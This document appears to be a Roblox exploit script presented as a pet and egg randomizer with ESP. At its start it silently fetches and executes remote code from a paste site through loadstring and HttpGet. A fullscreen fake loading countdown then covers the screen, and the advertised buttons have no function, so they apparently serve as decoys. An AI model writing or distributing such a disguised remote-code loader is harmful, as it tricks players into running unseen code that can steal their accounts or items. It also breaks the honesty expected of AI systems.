--// Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
repeat task.wait() until player:FindFirstChild("PlayerGui")

--// Execute Main Script
pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
end)

--// ScreenGui Setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FullLoadingUI"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
screenGui.Parent = player:WaitForChild("PlayerGui")

--// Fullscreen Cover
local bgFrame = Instance.new("Frame")
bgFrame.Size = UDim2.new(1, 0, 1, 0)
bgFrame.Position = UDim2.new(0, 0, 0, 0)
bgFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bgFrame.BorderSizePixel = 0
bgFrame.Parent = screenGui

--// Top Label
local topLabel = Instance.new("TextLabel")
topLabel.Size = UDim2.new(1, 0, 0.1, 0)
topLabel.Position = UDim2.new(0, 0, 0.02, 0)
topLabel.BackgroundTransparency = 1
topLabel.Text = "Wait Until It Loads"
topLabel.Font = Enum.Font.GothamBold
topLabel.TextColor3 = Color3.fromRGB(255, 120, 0)
topLabel.TextScaled = true
topLabel.TextStrokeTransparency = 0.8
topLabel.TextStrokeColor3 = Color3.fromRGB(255, 70, 0)
topLabel.Parent = bgFrame

--// Loading Percentage
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0.3, 0)
loadingText.Position = UDim2.new(0, 0, 0.25, 0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "0%"
loadingText.Font = Enum.Font.GothamBlack
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.TextScaled = true
loadingText.TextStrokeTransparency = 0.6
loadingText.TextStrokeColor3 = Color3.new(0, 0, 0)
loadingText.Parent = bgFrame

--// Bottom Label
local bottomLabel = Instance.new("TextLabel")
bottomLabel.Size = UDim2.new(1, 0, 0.1, 0)
bottomLabel.Position = UDim2.new(0, 0, 0.88, 0)
bottomLabel.BackgroundTransparency = 1
bottomLabel.Text = "Be Patient"
bottomLabel.Font = Enum.Font.GothamBold
bottomLabel.TextColor3 = Color3.fromRGB(255, 80, 0)
bottomLabel.TextScaled = true
bottomLabel.TextStrokeTransparency = 0.8
bottomLabel.TextStrokeColor3 = Color3.fromRGB(255, 50, 0)
bottomLabel.Parent = bgFrame

--// Fire Emoji Animation
local function spawnFire()
	for _ = 1, 5 do
		local fire = Instance.new("TextLabel")
		fire.Text = "üî•"
		fire.Font = Enum.Font.SourceSansBold
		fire.TextScaled = true
		fire.TextColor3 = Color3.fromRGB(255, 100, 0)
		fire.BackgroundTransparency = 1
		fire.Size = UDim2.new(0.05, 0, 0.05, 0)
		fire.Position = UDim2.new(math.random(), 0, math.random(), 0)
		fire.Parent = bgFrame

		local goal = {
			Position = UDim2.new(math.random(), 0, math.random(), 0),
			TextTransparency = 1
		}
		TweenService:Create(fire, TweenInfo.new(5, Enum.EasingStyle.Linear), goal):Play()

		task.delay(5, function()
			fire:Destroy()
		end)
	end
end

--// Fire Loop
spawn(function()
	while bgFrame.Parent do
		spawnFire()
		task.wait(1)
	end
end)

--// Countdown Loading
spawn(function()
	for i = 1, 100 do
		loadingText.Text = i .. "%"
		task.wait(0.05)
	end
	bgFrame:Destroy() -- Remove only the screen blocker
end)

--// SIDE UI (persistent)
local sidePanel = Instance.new("Frame")
sidePanel.Size = UDim2.new(0, 200, 0.5, 0)
sidePanel.Position = UDim2.new(0, 10, 0.25, 0)
sidePanel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
sidePanel.BackgroundTransparency = 0.2
sidePanel.BorderSizePixel = 0
sidePanel.Parent = screenGui

local buttons = {
	{Text = "üé≤ Egg Randomizer", Name = "EggRandomizer"},
	{Text = "üéÆ Randomize Pets", Name = "RandomizePets"},
	{Text = "üëÅ ESP: OFF", Name = "ESP"},
	{Text = "üîÑ Auto Randomize: OFF", Name = "AutoRandomize"}
}

for i, data in ipairs(buttons) do
	local btn = Instance.new("TextButton")
	btn.Name = data.Name
	btn.Size = UDim2.new(1, -20, 0, 40)
	btn.Position = UDim2.new(0, 10, 0, (i - 1) * 50 + 10)
	btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.Font = Enum.Font.GothamBold
	btn.Text = data.Text
	btn.TextScaled = true
	btn.Parent = sidePanel

	-- Add visual toggle logic if needed later
end
